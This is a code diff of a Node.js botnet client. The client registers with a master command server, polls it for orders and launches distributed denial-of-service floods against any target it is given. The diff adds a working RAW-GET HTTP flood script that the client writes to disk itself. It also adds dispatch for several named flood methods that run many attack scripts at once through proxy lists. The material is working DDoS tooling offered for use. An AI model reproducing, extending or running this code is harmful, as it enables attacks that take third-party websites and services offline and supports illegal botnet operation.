@@ -1,6 +1,8 @@
 const express = require('express');
 const { exec } = require('child_process');
 const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const port = process.env.PORT || process.env.SERVER_PORT || 5552;
@@ -14,6 +16,96 @@ const MAX_REGISTRATION_ATTEMPTS = 5;
 let activeProcesses = []; // Track active attack processes
 let isBlocked = false; // Track if bot is blocked by server
 
+// ========== ENSURE METHODS DIRECTORY AND FILES ==========
+function ensureMethodFiles() {
+  const methodsDir = path.join(__dirname, 'methods');
+  if (!fs.existsSync(methodsDir)) {
+    fs.mkdirSync(methodsDir, { recursive: true });
+    console.log('[SETUP] Created methods directory');
+  }
+
+  // Create method stub for any missing methods
+  const methodStub = (name) => `console.log('[${name.toUpperCase()}] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+
+  const methodFiles = [
+    'cf-bypass.js', 'modern-flood.js', 'REX-COSTUM.js', 'cibi.js', 'BYPASS.js', 'nust.js',
+    'h2-nust.js', 'http-panel.js', 'high-dstat.js', 'w-flood1.js', 'vhold.js', 
+    'uam.js', 'wil.js', 'raw-get.js',
+    'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js',
+    'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'
+  ];
+
+  for (const file of methodFiles) {
+    const filePath = path.join(methodsDir, file);
+    if (!fs.existsSync(filePath)) {
+      fs.writeFileSync(filePath, methodStub(file.replace('.js', '')));
+      console.log(`[SETUP] Created method stub: ${file}`);
+    }
+  }
+
+  // Special RAW-GET with actual functionality
+  const rawGetPath = path.join(methodsDir, 'raw-get.js');
+  if (!fs.existsSync(rawGetPath)) {
+    const rawGetContent = `const http = require('http');
+const https = require('https');
+const url = require('url');
+const cluster = require('cluster');
+
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]) || 60,
+    threads: parseInt(process.argv[4]) || 10,
+    rate: parseInt(process.argv[5]) || 1000
+};
+
+const parsed = new URL(args.target);
+const isHttps = parsed.protocol === 'https:';
+const httpLib = isHttps ? https : http;
+const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
+
+if (cluster.isMaster) {
+    console.log(\`RAW-GET | \${args.target} | \${args.time}s | \${args.threads} workers | Rate: \${args.rate}/s\`);
+    for (let i = 0; i < args.threads; i++) cluster.fork();
+    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
+} else {
+    let running = true;
+    let requestCount = 0;
+    const sendRequest = () => {
+        if (!running) return;
+        const req = httpLib.request({
+            hostname: parsed.hostname,
+            port: parsed.port || (isHttps ? 443 : 80),
+            path: parsed.pathname + '?r=' + Math.random(),
+            method: 'GET',
+            agent: agent,
+            rejectUnauthorized: false
+        }, (res) => { 
+            requestCount++; 
+            res.resume(); 
+        });
+        req.on('error', () => {});
+        req.end();
+        if (running) setImmediate(sendRequest);
+    };
+    for (let i = 0; i < 10; i++) sendRequest();
+    setInterval(() => {
+        console.log(\`📊 RPS: \${requestCount}/s\`);
+        requestCount = 0;
+    }, 1000);
+    setTimeout(() => { running = false; process.exit(0); }, args.time * 1000);
+}`;
+    fs.writeFileSync(rawGetPath, rawGetContent);
+    console.log('[SETUP] Created RAW-GET method with full functionality');
+  }
+}
+
+// Call this before starting
+ensureMethodFiles();
+
+// ========== FETCH PUBLIC IP ==========
 async function fetchData() {
   try {
     const response = await fetch('https://httpbin.org/get');
@@ -39,13 +131,13 @@ async function fetchData() {
   }
 }
 
-// Auto-register with master server
+// ========== AUTO-REGISTER ==========
 async function autoRegister() {
   if (isBlocked) {
     console.log(`[BLOCKED] This bot has been permanently blocked by the server`);
     console.log(`[INFO] Bot will not attempt to reconnect`);
     console.log(`[INFO] Contact server admin to unblock: ${myBotUrl}`);
-    process.exit(0); // Exit the bot
+    process.exit(0);
   }
 
   if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
@@ -99,7 +191,7 @@ async function autoRegister() {
       console.log(`Server: ${MASTER_SERVER}`);
       console.log(`========================================\n`);
       isBlocked = true;
-      process.exit(0); // Exit the bot
+      process.exit(0);
       return;
     }
 
@@ -113,7 +205,7 @@ async function autoRegister() {
   }
 }
 
-// Send heartbeat to master to keep connection alive
+// ========== HEARTBEAT ==========
 async function sendHeartbeat() {
   try {
     await axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
@@ -126,7 +218,7 @@ async function sendHeartbeat() {
   }
 }
 
-// Poll for commands from master (pull-based system)
+// ========== CHECK COMMANDS ==========
 async function checkForCommands() {
   try {
     const response = await axios.get(`${MASTER_SERVER}/get-command`, {
@@ -151,13 +243,13 @@ async function checkForCommands() {
   }
 }
 
-// Stop all running attacks
+// ========== STOP ALL ATTACKS ==========
 function stopAllAttacks() {
   console.log(`[STOP] Killing ${activeProcesses.length} active processes`);
   
   activeProcesses.forEach(proc => {
     try {
-      process.kill(-proc.pid); // Kill process group
+      process.kill(-proc.pid);
       console.log(`[KILLED] Process ${proc.pid}`);
     } catch (error) {
       console.error(`[ERROR] Failed to kill process ${proc.pid}: ${error.message}`);
@@ -168,7 +260,7 @@ function stopAllAttacks() {
   console.log(`[STOP] All attacks stopped\n`);
 }
 
-// Execute attack methods
+// ========== EXECUTE ATTACK ==========
 function executeAttack(target, time, methods) {
   const execWithLog = (cmd) => {
     console.log(`[EXEC] ${cmd}`);
@@ -181,38 +273,52 @@ function executeAttack(target, time, methods) {
       if (stderr) console.error(`[STDERR] ${stderr}`);
     });
     
-    // Track the process so we can kill it later
     activeProcesses.push(proc);
     
-    // Auto-cleanup after attack duration
     setTimeout(() => {
       const index = activeProcesses.indexOf(proc);
       if (index > -1) {
         activeProcesses.splice(index, 1);
       }
-    }, parseInt(time) * 1000 + 5000); // Add 5s buffer
+    }, parseInt(time) * 1000 + 5000);
   };
 
-  if (methods === 'CF-BYPASS') {
+  // ========== METHOD HANDLING ==========
+  console.log(`\n[ATTACK] Method: ${methods}`);
+  console.log(`[ATTACK] Target: ${target}`);
+  console.log(`[ATTACK] Duration: ${time}s`);
+  console.log('='.repeat(60));
+
+  // RAW-GET method
+  if (methods === 'RAW-GET') {
+    console.log('[OK] Executing RAW-GET');
+    execWithLog(`node methods/raw-get.js ${target} ${time} 20 800`);
+  }
+  // CF-BYPASS method
+  else if (methods === 'CF-BYPASS') {
     console.log('[OK] Executing CF-BYPASS');
     execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
   }
+  // MODERN-FLOOD method
   else if (methods === 'MODERN-FLOOD') {
     console.log('[OK] Executing MODERN-FLOOD');
     execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
   }
+  // HTTP-SICARIO method
   else if (methods === 'HTTP-SICARIO') {
     console.log('[OK] Executing HTTP-SICARIO');
     execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
     execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
     execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
-  } 
+  }
+  // RAW-HTTP method
   else if (methods === 'RAW-HTTP') {
     console.log('[OK] Executing RAW-HTTP');
-    execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
+    execWithLog(`node methods/h2-nust.js ${target} ${time} 15 2 proxy.txt`);
     execWithLog(`node methods/http-panel.js ${target} ${time}`);
-  } 
+  }
+  // R9 method
   else if (methods === 'R9') {
     console.log('[OK] Executing R9');
     execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
@@ -220,7 +326,8 @@ function executeAttack(target, time, methods) {
     execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
-  } 
+  }
+  // PRIV-TOR method
   else if (methods === 'PRIV-TOR') {
     console.log('[OK] Executing PRIV-TOR');
     execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
@@ -228,11 +335,13 @@ function executeAttack(target, time, methods) {
     execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
     execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
-  } 
+  }
+  // HOLD-PANEL method
   else if (methods === 'HOLD-PANEL') {
     console.log('[OK] Executing HOLD-PANEL');
     execWithLog(`node methods/http-panel.js ${target} ${time}`);
-  } 
+  }
+  // R1 method
   else if (methods === 'R1') {
     console.log('[OK] Executing R1');
     execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
@@ -244,20 +353,55 @@ function executeAttack(target, time, methods) {
     execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
   }
+  // UAM method
   else if (methods === 'UAM') {
     console.log('[OK] Executing UAM');
     execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
   }
+  // W.I.L method
   else if (methods === 'W.I.L') {
     console.log('[OK] Executing W.I.L - Web Intensive Load');
     execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
   }
+  // RAPID10 method
+  else if (methods === 'RAPID10') {
+    console.log('[OK] Executing RAPID10 - 10 Methods Simultaneously');
+    execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
+  }
+  // R10 alias
+  else if (methods === 'R10') {
+    console.log('[OK] Executing R10 (alias for RAPID10)');
+    execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
+    execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
+  }
+  // Unknown method
   else {
     console.log(`[ERROR] Unknown method: ${methods}`);
+    console.log(`[INFO] Available methods: RAW-GET, CF-BYPASS, MODERN-FLOOD, HTTP-SICARIO, RAW-HTTP, R9, PRIV-TOR, HOLD-PANEL, R1, UAM, W.I.L, RAPID10, R10`);
   }
+
+  console.log('='.repeat(60));
+  console.log(`[ATTACK] ${methods} attack started on ${target}\n`);
 }
 
-// Health check endpoint
+// ========== HEALTH CHECK ==========
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'online', 
@@ -269,7 +413,7 @@ app.get('/health', (req, res) => {
   });
 });
 
-// Ping endpoint
+// ========== PING ==========
 app.get('/ping', (req, res) => {
   res.json({ 
     alive: true,
@@ -279,7 +423,7 @@ app.get('/ping', (req, res) => {
   });
 });
 
-// Receive attack commands from master server (kept for backward compatibility)
+// ========== RECEIVE ATTACK COMMANDS ==========
 app.get('/attack', (req, res) => {
   const { target, time, methods } = req.query;
 
@@ -304,10 +448,10 @@ app.get('/attack', (req, res) => {
   executeAttack(target, time, methods);
 });
 
+// ========== START SERVER ==========
 app.listen(port, async () => {
   await fetchData();
   
-  // Wait 3 seconds then auto-register
   console.log('[INFO] Starting auto-registration in 3 seconds...\n');
   setTimeout(() => {
     autoRegister();
